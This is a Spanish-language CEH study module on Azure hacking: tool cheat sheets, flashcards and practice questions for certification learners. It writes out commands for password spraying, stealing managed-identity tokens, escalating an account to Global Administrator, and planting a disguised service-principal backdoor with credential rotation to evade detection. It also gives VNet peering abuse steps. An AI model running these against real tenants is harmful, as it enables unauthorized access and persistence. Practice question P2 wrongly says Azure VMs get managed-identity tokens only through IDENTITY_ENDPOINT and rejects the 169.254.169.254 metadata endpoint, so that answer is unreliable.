# M19_07 — Microsoft Azure Hacking
**Módulo 19 / Subapartado 7 — Microsoft Azure Hacking**

---

## 1. Conceptos y definiciones

### 🔴 Herramientas de Azure Hacking — mapa general

| Herramienta | Categoría | Función principal |
|------------|----------|-----------------|
| **AADInternals** | Reconocimiento | PowerShell module; recon, explotación y post-explotación en Azure AD / Office 365 |
| **MicroBurst** | Enumeración | Enumera servicios y recursos de una suscripción Azure; output en CSV y texto |
| **AzureGraph** | Enumeración AD | Usa Microsoft Graph API; obtiene users, devices, apps, dominios de Azure AD |
| **Spray365** | Password Spraying | Genera plan de ejecución, ejecuta spraying y revisa resultados para cuentas Office 365 / Azure AD |
| **Stormspotter** | Attack Surface | Mapea objetos Azure y Azure AD en grafo visual; identifica movimiento lateral dentro del tenant |
| **AzureHound** | Recolección de datos | Recopila datos de Azure AD y AzureRM para importar en **BloodHound** |
| **Goblob** | Blob Storage | Enumeración de blob storage públicamente expuestos en Azure |
| **AzureGoat** | Practice/Lab | Infraestructura Azure vulnerable por diseño; OWASP Top 10 + misconfigurations reales |

---

### AADInternals — comandos de reconocimiento

```powershell
# Recon externo del tenant (sin credenciales)
Invoke-AADIntReconAsOutsider -Domain <domain> | Format-Table

# Info de login para dominio/usuario
Get-AADIntLoginInformation -Domain <domain>

# Todos los dominios registrados del tenant
Get-AADIntTenantDomains -Domain <domain>
```

**Comandos adicionales clave:**

| Comando | Información obtenida |
|---------|---------------------|
| `Get-AADIntTenantID -Domain <d>` | Tenant ID del dominio |
| `Get-AADIntTenantDetails` | Detalles del tenant |
| `Get-AADIntTenantAuthPolicy` | Política de autorización del tenant (user + guest settings) |
| `Get-AADIntOpenIDConfiguration -Domain <d>` | Configuración OpenID del dominio |
| `Get-AADIntServiceLocations \| Format-Table` | Ubicaciones reales de los servicios del tenant |
| `Get-AADIntServicePlans \| Format-Table` | Planes de servicio (nombre, id, estado, fecha asignación) |
| `Get-AADIntSubscriptions` | Suscripciones del tenant (nombre, id, licencias, fecha creación) |
| `Get-AADIntEndpointIps -Instance WorldWide` | IPs y URLs de Office 365 para la instancia |
| `Get-AADIntKerberosDomainSyncConfig -AccessToken` | Configuración de sincronización Kerberos via Azure AD Sync API |
| `Invoke-AADIntReconAsInsider` | Recon como insider (con credenciales) |
| `Get-AADIntSyncConfiguration` | Detalles de sincronización |
| `Get-AADIntAzureADPolicies` | Políticas de Azure AD |
| `Get-AADIntCompanyTags -Domain <d>` | Tags del tenant |

---

### MicroBurst — enumeración de recursos Azure

```powershell
# Importar módulo
Import-Module .\MicroBurst.psm1

# Crear directorio de output
New-Item -Name "microburst_output" -ItemType "directory"

# Enumerar servicios y recursos Azure
Get-AzDomainInfo -Verbose -Folder microburst-output
# Output: CSV + texto en carpeta especificada; subcarpeta "Az"

# Abrir carpeta con resultados
explorer microburst-output
```

> MicroBurst **no requiere privilegios admin locales** pero sí permisos de Azure AD y ARM. Mínimo: rol **Reader** para enumerar recursos.

---

### AzureGraph — enumeración de Azure AD

```r
# Autenticación y creación de sesión
gr <- create_graph_login()

# Listar todos los usuarios del tenant
gr$list_users()

# Info del usuario autenticado
me <- gr$get_user("username")

# Grupos del usuario autenticado
head(me$list_group_memberships())

# Aplicaciones propiedad del usuario
me$list_owned_objects(type="application_name")
```

---

### Spray365 — password spraying en Azure AD / Office 365

Password spraying: prueba **una sola contraseña contra todas las cuentas simultáneamente** → evita lockouts.

```bash
# Generar plan de ejecución
python spray365.py generate -d <domain> -u <usernames_file> -pf <passwords_file> -ep <execution_plan_filename>

# Ejecutar spraying
python3 spray365.py spray -ep <execution_plan_filename>

# Revisar resultados
python3 spray365.py review <spray_results_json_filename>
```

---

### Stormspotter — mapeo de attack surface

Mapea objetos Azure y Azure AD en **grafo visual**; identifica superficies de ataque y rutas de movimiento lateral dentro del tenant.

```bash
# Modo CLI (usa autenticación Azure CLI activa)
python3 sscollector.pyz cli

# Modo service principal (credenciales explícitas)
python3 sscollector.pyz spn -t <tenant> -c <clientID> -s <clientSecret>
# -t: Azure tenant ID
# -c: Client ID del service principal
# -s: Client secret del service principal
```

---

### AzureHound — recolección para BloodHound

Recopila datos de **Azure AD + Azure Resource Manager (AzureRM)**. Output importable en **BloodHound** para visualización.

Métodos de autenticación: credenciales de usuario, JWT, refresh token, service principal secret, service principal certificate.

```bash
# Print datos del tenant a stdout
azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT"

# Guardar datos en fichero JSON
azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT" -o "mytenant.json"

# Configurar y arrancar servicio para BloodHound
azurehound configure
azurehound start
```

---

### Goblob — enumeración de Azure Blob Storage expuesto

```bash
# Enumerar blob storage de una cuenta
./goblob <storageaccountname>

# Múltiples cuentas desde fichero
./goblob -accounts accounts.txt

# Wordlist personalizada de nombres de contenedores
./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt

# Guardar resultados en fichero
./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt -output results.txt
```

---

### Identificación de NSGs abiertos en Azure

**Via Azure CLI:**

```bash
# Listar todos los NSGs
az network nsg list --out table

# Detalles de un NSG específico
az network nsg show --resource-group <RG> --name <NSGName>

# Listar reglas de un NSG
az network nsg rule list --resource-group <RG> --nsg-name <NSGName> --output table

# Filtrar reglas con acceso inbound desde cualquier IP (0.0.0.0/0)
az network nsg rule list --resource-group <RG> --nsg-name <NSGName> --query "[?direction=='Inbound' && sourceAddressPrefix=='*']" --output table
```

Puertos de riesgo: SSH (22), HTTP (80), HTTPS (443), MySQL (3306).

---

### Explotación de Managed Identities + Azure Functions

```bash
# Step 1: Explotar command injection para obtener access token via IDENTITY_ENDPOINT
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# Step 2: Instalar módulo Az y autenticar con el token obtenido
Install-Module -Name Az -Repository PSGallery -Force
Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>

# Step 3: Listar recursos accesibles por la managed identity
Get-AzResource

# Step 4: Comprobar acceso a claves de Storage Account
Get-AzStorageAccountKey -ResourceGroupName "<rg>" -AccountName "<account>"
# Si devuelve dos claves → se puede conectar a Azure Storage Explorer con ellas
```

---

### 🔴 Privilege Escalation en Azure AD (misconfigured user accounts)

```powershell
# Step 1: Descubrir cuenta normal con BloodHound/AzureHound
# Step 2: Login en Azure AD con cuenta normal
Connect-AzureAD

# Step 3: Crear nuevo key credential (certificado autofirmado)
$pwd = <password>
$path = <thumbprint>
Export-PfxCertificate -cert $path -FilePath <path> -Password $pwd

# Step 4: Subir certificado a la aplicación registrada en Azure AD

# Step 5: Autenticar con el certificado y escalar a Global Administrator
Connect-AzureAD -TenantId <tenant_id> -ApplicationId <app_id> -CertificateThumbPrint <thumbprint>
Add-AzureADDirectoryRoleMember -RefObjectId <normaluser_object_ID> -ObjectId <Globaladmin_ID>
```

> Steps 3–5 requieren **privilegios elevados de gestión de directorio**. Sin ellos, los comandos fallan.

---

### 🔴 Creación de backdoors persistentes en Azure AD (Service Principals)

```bash
# Step 1: Listar roles disponibles
az role definition list --output table

# Step 2: Crear nuevo service principal
az ad sp create-for-rbac --name <service-principal-name>
# Devuelve: client ID y secret

# Step 3: Asignar rol privilegiado al service principal
az role assignment create --assignee <sp-id> --role "Owner"

# Step 4: Verificar asignación
az role assignment list --assignee <sp-id> --output table

# Step 5: Rotar credenciales periódicamente para evitar detección
az ad sp credential reset --name <sp-id>
```

> Nombre de SP: usar convenciones legítimas (ej. "ProductionServicePrincipal") para camuflarse.
> Permisos requeridos: **Directory.ReadWrite.All** y **RoleManagement.ReadWrite.Directory**.

---

### Explotación de VNet Peering

| Acción | Comando | Objetivo |
|--------|---------|---------|
| Crear peering no autorizado | `az network vnet peering create ... --allow-vnet-access` | Establecer path de red entre VNets |
| Habilitar traffic forwarding | `az network vnet peering update ... allowForwardedTraffic=true` | Permitir tráfico desde VMs comprometidas |
| Usar remote gateway | `az network vnet peering update ... useRemoteGateways=true` | Acceder a redes adicionales u on-premises |
| Habilitar gateway transit | `az network vnet peering update ... allowGatewayTransit=true` | Usar VPN gateway del target VNet |
| Eliminar peerings legítimos | `az network vnet peering delete ...` | Forzar tráfico por rutas comprometidas |
| Sincronizar cambios | `az network vnet peering sync ...` | Asegurar persistencia de configuración del atacante |

---

## 2. Exam Traps ⚠️

⚠️ **[AADInternals — reconocimiento sin credenciales]**
`Invoke-AADIntReconAsOutsider` funciona **sin credenciales** (recon externo). `Invoke-AADIntReconAsInsider` requiere credenciales. El examen puede presentarlos como equivalentes.

⚠️ **[MicroBurst — privilegios requeridos]**
MicroBurst **no requiere admin local** pero sí permisos de Azure AD y ARM. El mínimo es el rol **Reader**. El examen puede afirmar que requiere admin.

⚠️ **[Spray365 — mecanismo anti-lockout]**
Password spraying prueba **una contraseña contra todas las cuentas simultáneamente** (no múltiples contraseñas contra una cuenta). Esto evita los lockouts por intentos fallidos en una sola cuenta. El examen puede confundirlo con brute force tradicional.

⚠️ **[AzureHound — herramienta de destino]**
AzureHound recopila datos de Azure AD y AzureRM para importar en **BloodHound**. No es una herramienta standalone de visualización; BloodHound hace la visualización. El examen puede presentar AzureHound como la herramienta de visualización.

⚠️ **[Stormspotter — autenticación SPN]**
Stormspotter en modo SPN requiere tres parámetros: `-t` (tenant), `-c` (clientID), `-s` (clientSecret). El modo CLI usa la autenticación Azure CLI activa. El examen puede mezclar los parámetros.

⚠️ **[Managed Identities — variable de entorno]**
La URL del endpoint de identidad en Azure Functions se obtiene de la variable de entorno `$IDENTITY_ENDPOINT` con el header `$IDENTITY_HEADER`. Equivalente al IMDS de AWS pero con variables de entorno en lugar de IP fija. El examen puede confundir el mecanismo con el IMDS de AWS.

⚠️ **[Privilege Escalation Azure AD — pasos que requieren admin]**
Los Steps 3–5 de la escalada (crear certificado, subirlo, asignar rol Global Administrator) **requieren privilegios elevados de directorio**. El examen puede presentar la escalada completa como realizable con una cuenta normal.

⚠️ **[Service Principal Backdoor — permisos requeridos]**
Para crear backdoors con service principals se requieren: **Directory.ReadWrite.All** y **RoleManagement.ReadWrite.Directory**. El examen puede omitir estos permisos específicos.

⚠️ **[VNet Peering — gateway transit]**
`allowGatewayTransit=true` permite usar el VPN gateway del target VNet para acceder a la red. `useRemoteGateways=true` hace que el atacante use el gateway remoto del target. Son parámetros distintos con efectos distintos.

⚠️ **[NSG — filtro de IP en Azure CLI]**
El filtro para inbound desde cualquier IP en Azure CLI usa `sourceAddressPrefix=='*'` (asterisco), no `0.0.0.0/0` como en la comparación visual. El examen puede presentar el filtro con CIDR en lugar de asterisco.

---

## 3. Nemotécnicos

### Herramientas Azure por categoría
- **Recon externo**: **AAD**Internals (PowerShell, Azure AD/O365)
- **Enumeración recursos**: **Micro**Burst (CSV output, rol Reader mínimo)
- **Enumeración AD**: **Azure**Graph (Microsoft Graph API, R-style)
- **Password spraying**: **Spray**365 (generate→spray→review)
- **Attack surface**: **Storm**spotter (grafo visual, CLI o SPN)
- **BloodHound feed**: **Azure**Hound (AzureAD + AzureRM → BloodHound)
- **Blob storage**: **Go**blob (lightweight, wordlist de containers)

### Spray365 — flujo de 3 pasos
**"Gen-Spray-Review"**
→ `generate` (crear plan) | `spray` (ejecutar con `-ep`) | `review` (revisar JSON)

### VNet Peering — 4 flags de ataque
**"F-R-G-T"** → **F**orwardedTraffic | **R**emoteGateways | **G**atewayTransit | (delete **T**arget peerings)

### Azure Privilege Escalation — paso clave
`Add-AzureADDirectoryRoleMember -RefObjectId <usuario_normal_ID> -ObjectId <GlobalAdmin_ID>`
→ Asigna el rol Global Administrator a una cuenta normal

### Service Principal Backdoor — comando de ocultación
`az ad sp credential reset --name <sp-id>` → rotación periódica de credenciales para evitar detección

---

## 4. Flashcards

**Q:** ¿Qué herramienta de PowerShell se usa para reconocimiento externo de Azure AD sin credenciales?
**A:** AADInternals. Comando: `Invoke-AADIntReconAsOutsider -Domain <domain> | Format-Table`.

---

**Q:** ¿Cuál es el privilegio mínimo requerido para ejecutar MicroBurst en Azure?
**A:** Rol Reader en Azure AD/ARM. No requiere privilegios admin locales.

---

**Q:** ¿Cómo evita el password spraying los lockouts de cuenta?
**A:** Prueba una sola contraseña contra todas las cuentas simultáneamente, en lugar de múltiples contraseñas contra una cuenta. Así ninguna cuenta supera el umbral de intentos fallidos.

---

**Q:** ¿Para qué herramienta recopila datos AzureHound?
**A:** BloodHound. AzureHound recoge datos de Azure AD y AzureRM y los importa en BloodHound para visualización.

---

**Q:** ¿Cuáles son los tres parámetros del modo SPN de Stormspotter?
**A:** `-t` (tenant ID), `-c` (client ID del service principal), `-s` (client secret).

---

**Q:** ¿Qué variable de entorno proporciona el endpoint de autenticación de managed identity en Azure Functions?
**A:** `$IDENTITY_ENDPOINT` (con header `$IDENTITY_HEADER`). Equivale funcionalmente al IMDS de AWS pero con variables de entorno en lugar de IP fija.

---

**Q:** ¿Qué comando de Azure AD PowerShell asigna el rol Global Administrator a una cuenta normal?
**A:** `Add-AzureADDirectoryRoleMember -RefObjectId <normaluser_object_ID> -ObjectId <Globaladmin_ID>`

---

**Q:** ¿Qué permisos de Azure AD son necesarios para crear backdoors con service principals?
**A:** `Directory.ReadWrite.All` y `RoleManagement.ReadWrite.Directory`.

---

**Q:** ¿Qué hace `allowGatewayTransit=true` en VNet Peering?
**A:** Permite al atacante usar el VPN gateway del target VNet para acceder a la red del target o recursos on-premises.

---

**Q:** ¿Qué diferencia hay entre `useRemoteGateways=true` y `allowGatewayTransit=true` en VNet Peering?
**A:** `useRemoteGateways=true`: el atacante configura su VNet para usar el gateway remoto del target. `allowGatewayTransit=true`: habilita que otros usen el VPN gateway del target. Se usan en conjunto para acceder a redes adicionales.

---

**Q:** ¿Qué comando de Azure CLI lista todos los NSGs de una suscripción?
**A:** `az network nsg list --out table`

---

**Q:** ¿Qué filtro de Azure CLI identifica reglas NSG con acceso inbound desde cualquier IP?
**A:** `--query "[?direction=='Inbound' && sourceAddressPrefix=='*']"`

---

**Q:** ¿Cuál es el flujo completo de Spray365?
**A:** 1) `generate` (crear plan de ejecución con dominio, usuarios y contraseñas), 2) `spray -ep` (ejecutar spraying con el plan), 3) `review` (revisar resultados JSON).

---

**Q:** ¿Qué hace el comando `az ad sp create-for-rbac --name <name>` en el contexto de backdoors Azure?
**A:** Crea un nuevo service principal y devuelve su client ID y secret para su uso posterior en asignación de roles privilegiados.

---

**Q:** ¿Qué hace `az network vnet peering delete` en un ataque de VNet Peering?
**A:** Elimina peerings legítimos existentes, forzando el tráfico a través de rutas comprometidas o maliciosas.

---

**Q:** ¿Qué herramienta de Azure hacking genera un grafo visual de objetos Azure y Azure AD para identificar movimiento lateral?
**A:** Stormspotter. Su módulo Stormcollector lista todas las suscripciones accesibles con las credenciales proporcionadas.

---

**Q:** ¿Qué información obtiene `Get-AADIntTenantAuthPolicy` de AADInternals?
**A:** La política de autorización del tenant, incluyendo configuraciones de usuario y guest.

---

**Q:** ¿Cuál es la técnica de camuflaje al crear service principal backdoors en Azure?
**A:** Usar convenciones de nombres legítimas (ej. "ProductionServicePrincipal") y rotar credenciales periódicamente con `az ad sp credential reset`.

---

## 5. Confusión frecuente

**AADInternals Outsider vs. Insider**
- `Invoke-AADIntReconAsOutsider`: reconocimiento **sin credenciales**, desde el exterior; obtiene dominios verificados del tenant.
- `Invoke-AADIntReconAsInsider`: reconocimiento **con credenciales** de un usuario del tenant; mayor profundidad de información.
- Criterio: si el escenario describe un atacante sin acceso previo → Outsider. Si tiene credenciales de usuario → Insider.

---

**Stormspotter vs. AzureHound — finalidad**
- Stormspotter: genera un **grafo visual interactivo** directamente; sirve para identificar superficies de ataque y rutas de movimiento lateral **en Azure**.
- AzureHound: recopila datos de Azure AD/AzureRM y los **importa en BloodHound** para visualización. BloodHound hace la visualización.
- Criterio: si la pregunta habla de visualización standalone en Azure → Stormspotter. Si menciona BloodHound como herramienta de visualización → AzureHound.

---

**Password Spraying vs. Brute Force**
- Brute Force: múltiples contraseñas contra una cuenta → riesgo de lockout.
- Password Spraying: una contraseña contra todas las cuentas simultáneamente → evita lockouts; si no hay MFA, alta probabilidad de éxito.
- Criterio: si el escenario describe evitar lockouts con Azure AD → Password Spraying (Spray365).

---

**Managed Identity (Azure) vs. IMDS (AWS)**
- AWS IMDS: IP fija `169.254.169.254`; IMDSv1 sin auth, IMDSv2 con token PUT.
- Azure Managed Identity: variables de entorno `$IDENTITY_ENDPOINT` y `$IDENTITY_HEADER`; sin IP fija hardcodeada.
- Criterio: si la pregunta menciona `169.254.169.254` → AWS IMDS. Si menciona `IDENTITY_ENDPOINT` como variable de entorno → Azure Managed Identity.

---

**VNet Peering — allowForwardedTraffic vs. allowGatewayTransit vs. useRemoteGateways**
- `allowForwardedTraffic=true`: permite que tráfico desde VMs comprometidas atraviese el VNet peering (traffic forwarding).
- `allowGatewayTransit=true`: permite que otros usen el VPN gateway de este VNet.
- `useRemoteGateways=true`: este VNet usa el gateway remoto del VNet con el que hace peering.
- Criterio: si el objetivo es acceder a la red on-premises del target → `useRemoteGateways` + `allowGatewayTransit` en el target.

---

## 6. Preguntas de Práctica — Formato CEH

**P1.** Un pentester obtiene credenciales de Azure y quiere enumerar todos los recursos de la suscripción. ¿Cuál es el primer comando de Azure CLI que debe ejecutar para listar las suscripciones disponibles?

A) `az group list`  
B) `az account list`  
C) `az resource list`  
D) `az identity list`  

**Respuesta correcta: B**
`az account list` lista todas las **suscripciones Azure** disponibles para las credenciales actuales. Este es el punto de partida de la enumeración Azure — primero identificar las suscripciones, luego los resource groups, y finalmente los recursos individuales.

---

**P2.** Un atacante encuentra una VM Azure con Managed Identity habilitada. ¿Cómo obtiene las credenciales del Managed Identity desde dentro de la VM, y cuál es la diferencia con el método AWS?

A) Consulta `http://169.254.169.254/latest/meta-data/` — igual que AWS  
B) Usa las variables de entorno `$IDENTITY_ENDPOINT` y `$IDENTITY_HEADER` — diferente de AWS que usa IP fija  
C) Ejecuta `az login --identity` directamente  
D) Accede a `http://169.254.169.254/metadata/identity/oauth2/token` — igual que AWS  

**Respuesta correcta: B**
**Azure Managed Identity** usa las variables de entorno **`$IDENTITY_ENDPOINT`** y **`$IDENTITY_HEADER`** para obtener credenciales, sin IP fija hardcodeada. AWS IMDS usa la IP fija `169.254.169.254`. Esta diferencia es importante: si un escenario menciona `IDENTITY_ENDPOINT` como variable de entorno → Azure. Si menciona `169.254.169.254` → AWS.

---

**P3.** Un red team realiza password spraying contra Azure AD. ¿Qué herramienta es específica para Azure AD password spraying y cómo evita los account lockouts?

A) Mimikatz — extrae credenciales de memoria para reutilizarlas  
B) Spray365 — prueba una contraseña contra todos los usuarios simultáneamente, evitando lockouts  
C) PowerSploit — usa módulos de PowerShell para fuerza bruta  
D) ROADtools — enumera objetos del tenant Azure AD  

**Respuesta correcta: B**
**Spray365** es la herramienta específica para **password spraying en Azure AD**. Prueba **una contraseña contra todas las cuentas** simultáneamente en lugar de múltiples contraseñas contra una cuenta, evitando los mecanismos de lockout. Si no hay MFA, tiene alta probabilidad de éxito con contraseñas comunes.

---

**P4.** Un auditor de seguridad Azure usa **ROADtools** para analizar el tenant. ¿Qué información específica puede enumerar ROADtools que lo hace útil en un pentest de Azure?

A) Vulnerabilidades de OS en VMs Azure  
B) Objetos del tenant Azure AD: usuarios, grupos, aplicaciones, service principals  
C) Misconfigurations en Azure Storage Accounts  
D) Logs de acceso de Azure Activity Log  

**Respuesta correcta: B**
**ROADtools** enumera **objetos del tenant Azure AD**: usuarios, grupos, aplicaciones registradas, service principals y sus permisos. Es la herramienta de enumeración de Azure AD equivalente a BloodHound para Active Directory on-premises.

---

**P5.** Un pentester consigue credenciales de Azure y descubre que la cuenta tiene permisos para crear una nueva versión de una Azure Function existente. ¿Qué acción de post-exploitation puede realizar?

A) Leer el Azure Key Vault si tiene permisos de lectura  
B) Actualizar el código de la Function para incluir una web shell o backdoor  
C) Crear un nuevo tenant Azure AD  
D) Exportar todos los Managed Identity tokens del tenant  

**Respuesta correcta: B**
Si un atacante tiene permisos para **actualizar el código de una Azure Function**, puede insertar una web shell o backdoor directamente en el código, convirtiendo la Function en un punto de acceso persistente. Esta es una técnica de post-exploitation específica de Azure FaaS.

---

**P6.** Un analista estudia Azure Storage. Un atacante descubrió un Storage Account con Anonymous access habilitado en un container blob. ¿Qué dato puede obtener el atacante sin credenciales?

A) Nada — Azure siempre requiere autenticación  
B) Solo metadatos del container, no el contenido  
C) Todo el contenido del container blob si el acceso anónimo está habilitado  
D) Solo el nombre del Storage Account  

**Respuesta correcta: C**
Si **Anonymous access** está habilitado en un container blob de Azure Storage, cualquier persona puede listar y descargar **todo el contenido del container** sin credenciales. Esta es una de las misconfigurations más comunes en Azure y una fuente frecuente de data breaches.

---

**P7.** Durante un pentest de Azure, el atacante enumera los Azure Key Vaults de la suscripción comprometida. Encuentra un Key Vault con políticas de acceso que permiten `list` y `get` para todos los usuarios del tenant. ¿Qué datos sensibles puede obtener?

A) Solo los nombres de los secrets, no sus valores  
B) Los nombres y valores de secrets, keys y certificates almacenados en el Key Vault  
C) Solo los certificados TLS, no los secrets  
D) Nada — los Key Vaults requieren MFA adicional  

**Respuesta correcta: B**
Con permisos `list` y `get` en un Azure Key Vault, el atacante puede obtener tanto los **nombres como los valores de todos los secrets, keys y certificates** almacenados. Los Key Vaults almacenan credenciales de bases de datos, API keys, connection strings y certificados — una fuente de valor crítico en un pentest.

---

**P8.** Un CISO compara Azure Active Directory (Azure AD / Entra ID) con Active Directory on-premises. ¿Cuál es la diferencia fundamental en el protocolo de autenticación usado?

A) Azure AD usa Kerberos; AD on-premises usa SAML  
B) Azure AD usa SAML/OAuth/OIDC para cloud federation; AD on-premises usa Kerberos/NTLM  
C) Ambos usan Kerberos pero en diferentes versiones  
D) Azure AD usa LDAP; AD on-premises usa OAuth  

**Respuesta correcta: B**
**Azure AD (Entra ID)** usa protocolos modernos de identidad cloud: **SAML, OAuth 2.0, OpenID Connect (OIDC)**. **AD on-premises** usa protocolos de red Windows: **Kerberos y NTLM**. Esta diferencia es fundamental: los ataques Golden Ticket/Pass-the-Hash son específicos de AD on-premises; los ataques Golden SAML/Pass-the-Cookie son específicos de Azure AD.
